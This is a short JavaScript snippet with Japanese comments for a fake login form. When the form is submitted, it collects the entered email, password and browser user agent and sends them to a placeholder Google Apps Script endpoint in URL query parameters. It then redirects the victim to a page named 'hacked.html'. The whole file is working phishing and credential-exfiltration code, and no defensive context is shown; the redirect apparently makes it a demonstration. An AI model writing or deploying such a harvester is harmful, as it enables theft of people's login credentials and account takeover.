document.getElementById("fakeLoginForm").addEventListener("submit", function(event) {
    event.preventDefault();

    let email = document.getElementById("email").value;
    let password = document.getElementById("password").value;
    let userAgent = navigator.userAgent;

    const gasUrl = "****ここにGoogle Apps ScriptのデプロイURLを入れる****";

    // GASにログ情報を送信
    fetch(gasUrl + "?email=" + encodeURIComponent(email) + "&password=" + encodeURIComponent(password) + "&ua=" + encodeURIComponent(userAgent))
        .then(response => response.text())
        .then(data => console.log("送信成功: ", data))
        .catch(error => console.error("エラー:", error));

    window.location.href = "hacked.html";
});
